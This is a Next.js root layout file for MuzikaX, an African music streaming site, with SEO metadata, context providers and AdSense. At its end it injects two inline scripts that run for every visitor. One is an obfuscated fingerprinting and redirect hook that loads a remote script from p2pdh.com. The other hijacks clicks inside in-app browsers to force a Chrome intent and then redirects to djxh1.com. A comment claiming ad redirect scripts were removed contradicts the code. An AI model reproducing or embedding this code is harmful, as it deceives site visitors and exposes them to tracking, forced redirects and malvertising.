import type { Metadata, Viewport } from "next";
import Script from 'next/script';
import "./globals.css";
import { AuthProvider } from "../contexts/AuthContext";
import { LanguageProvider } from "../contexts/LanguageContext";
import { AudioPlayerProvider } from "../contexts/AudioPlayerContext";
import { CommunityProvider } from "../contexts/CommunityContext";
import { PaymentProvider } from "../contexts/PaymentContext";
import { ToastProvider } from "../contexts/ToastContext";
import ErrorBoundary from "../components/ErrorBoundary";
import ModernAudioPlayer from "../components/ModernAudioPlayer";
import PWAInstallPrompt from "../components/PWAInstallPrompt";
import ContactFloatingButton from "../components/ContactFloatingButton";
import { GoogleOAuthProvider } from '@react-oauth/google';
import ConditionalNavbar from "../components/ConditionalNavbar";
import ConditionalSidebar from "../components/ConditionalSidebar";
import SidebarLayoutWrapper from "../components/SidebarLayoutWrapper";
import PushNotificationInitializer from "../components/PushNotificationInitializer";
import AdPopup from "../components/AdPopup";
import Footer from "../components/Footer";

export const metadata: Metadata = {
  metadataBase: new URL(process.env.NEXT_PUBLIC_BASE_URL || 'http://localhost:3000'),
  title: {
    template: '%s | MuzikaX - Rwanda & African Artists Music Platform',
    default: "MuzikaX - Rwanda & African Artists Music Platform",
  },
  description: "Connecting Rwandan and African music creators with fans worldwide. Discover, stream, and share the best of Rwandan and African music on MuzikaX. Free music streaming platform with artist resources, industry news, and educational content.",
  keywords: ["Rwandan music", "African music", "Afrobeats", "Music streaming", "Rwandan artists", "Music platform", "Digital music", "Free music", "Online radio", "Music discovery", "Artist resources", "Music education", "African culture", "Music industry news"],
  authors: [{ name: "MuzikaX Team" }],
  creator: "MuzikaX Team",
  publisher: "MuzikaX",
  formatDetection: {
    email: false,
    address: false,
    telephone: false,
  },
  // Structured data for SEO
  applicationName: "MuzikaX",
  referrer: "origin-when-cross-origin",
  // AdSense optimization metadata
  category: "music",
  classification: "entertainment",
  openGraph: {
    type: "website",
    locale: "en_US",
    url: "https://www.muzikax.com/",
    siteName: "MuzikaX",
    title: "MuzikaX - Rwanda & African Artists Music Platform",
    description: "Connecting Rwandan and African music creators with fans worldwide. Discover unique African music, artist resources, and industry insights.",
    images: [
      {
        url: "/og-image.jpg",
        width: 1200,
        height: 630,
        alt: "MuzikaX - Rwanda's Digital Music Ecosystem",
      },
    ],
  },
  twitter: {
    card: "summary_large_image",
    title: "MuzikaX - Rwanda & African Artists Music Platform",
    description: "Connecting Rwandan and African music creators with fans worldwide. Free music streaming with artist resources and industry news.",
    images: ["/og-image.jpg"],
    creator: "@muzikax",
  },
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      "max-video-preview": -1,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  alternates: {
    canonical: "https://www.muzikax.com/",
  },
  icons: {
    icon: [
      { url: '/favicon.ico' },
      { url: '/favicon-16x16.png', sizes: '16x16', type: 'image/png' },
      { url: '/favicon-32x32.png', sizes: '32x32', type: 'image/png' },
    ],
    apple: [
      { url: '/apple-touch-icon.png', sizes: '180x180', type: 'image/png' },
    ],
  },
};

export const viewport: Viewport = {
  width: 'device-width',
  initialScale: 1,
  maximumScale: 1,
  themeColor: '#000000',
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">
      <head>
        {/* Essential scripts only - removed ad redirect scripts */}
        <meta name="application-name" content="MuzikaX" />
        <meta name="mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-title" content="MuzikaX" />
        <meta name="theme-color" content="#000000" />
        <meta name="description" content="MuzikaX is Rwanda's premier digital music platform connecting African artists with global audiences. Discover unique African music, access artist resources, read industry news, and explore educational content." />
        <meta name="keywords" content="Rwandan music, African music, Afrobeats, Music streaming, Rwandan artists, Music platform, Digital music, Free music, Online radio, Music discovery, Artist resources, Music education, African culture, Music industry news" />
        <meta name="pushsdk" content="dd3dba6d9211c567d19da6eb4f51db7e" />
        <meta name="google-adsense-account" content="ca-pub-5073101063025875" />
        <script
          async
          src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5073101063025875"
          crossOrigin="anonymous"
        />
        <link rel="manifest" href="/manifest.json" />
      </head>
      <body className="min-h-screen flex flex-col overflow-x-hidden">
        {/* Structured Data for Rich Snippets */}
        <Script
          id="root-structured-data"
          type="application/ld+json"
          dangerouslySetInnerHTML={{
            __html: JSON.stringify({
              "@context": "https://schema.org",
              "@type": "MusicGroup",
              "name": "MuzikaX",
              "description": "Rwanda's digital music platform connecting African artists with global audiences",
              "url": "https://www.muzikax.com/",
              "sameAs": [
                "https://twitter.com/muzikax",
                "https://facebook.com/muzikax",
                "https://instagram.com/muzikax"
              ],
              "foundingDate": "2023",
              "location": {
                "@type": "Place",
                "address": {
                  "@type": "PostalAddress",
                  "addressLocality": "Kigali",
                  "addressCountry": "RW"
                }
              },
              "offers": {
                "@type": "Offer",
                "category": "MusicStreamingService",
                "price": "0",
                "priceCurrency": "USD"
              }
            })
          }}
        />
        <ErrorBoundary>
          <ToastProvider>
            <GoogleOAuthProvider clientId={process.env.NEXT_PUBLIC_GOOGLE_CLIENT_ID || "YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com"}>
              <AuthProvider>
                <LanguageProvider>
                  <AudioPlayerProvider>
                    <CommunityProvider>
                      <PaymentProvider>
                        <ConditionalSidebar />
                        <SidebarLayoutWrapper>
                          <ConditionalNavbar />
                          <PushNotificationInitializer />
                          <main className="flex-1">
                            {children}
                          </main>
                        </SidebarLayoutWrapper>
                        <ModernAudioPlayer />
                        <PWAInstallPrompt />
                        <ContactFloatingButton />
                        <AdPopup isEnabled={true} />
                        <Footer />
                      </PaymentProvider>
                    </CommunityProvider>
                  </AudioPlayerProvider>
                </LanguageProvider>
              </AuthProvider>
            </GoogleOAuthProvider>
          </ToastProvider>
        </ErrorBoundary>
        <Script
          id="custom-script-1"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `
              var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruoc=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]);    var s = document.createElement('script');    s.src='//p2pdh.com/277/80960/mw.min.js?z=10541573'+'&sw=/sw-check-permissions-53c39.js'+'&nouns=1';    s.onload = function(result) {        switch (result) {            case 'onPermissionDefault':break;            case 'onPermissionAllowed':break;            case 'onPermissionDenied':break;            case 'onAlreadySubscribed':break;            case 'onNotificationUnsupported':break;        }    };    document.head.appendChild(s);
            `
          }}
        />
        <Script
          id="custom-script-2"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `
              function isInApp() {        const regex = new RegExp(\`(WebView|(iPhone|iPod|iPad)(?!.*Safari/)|Android.*(wv))\`, 'ig');        return Boolean(navigator.userAgent.match(regex));    }    function initInappRd() {        var landingpageURL = window.location.hostname + window.location.pathname + window.location.search;        var completeRedirectURL = 'intent://' + landingpageURL + '#Intent;scheme=https;package=com.android.chrome;end';        var trafficbackURL = "https://djxh1.com/4/10541705/";        var ua = navigator.userAgent.toLowerCase();        if (isInApp() && (ua.indexOf('fb') !== -1 || ua.indexOf('android') !== -1 || ua.indexOf('wv') !== -1)) {            document.body.addEventListener('click', function () {                window.onbeforeunload = null;                window.open(completeRedirectURL, '_system');                setTimeout(function () {                    window.location.replace(trafficbackURL);                }, 1000);            });        }    }    if (document.readyState === 'loading') {        document.addEventListener('DOMContentLoaded', initInappRd);    } else {        initInappRd();    }
            `
          }}
        />
      </body>
    </html>
  );
}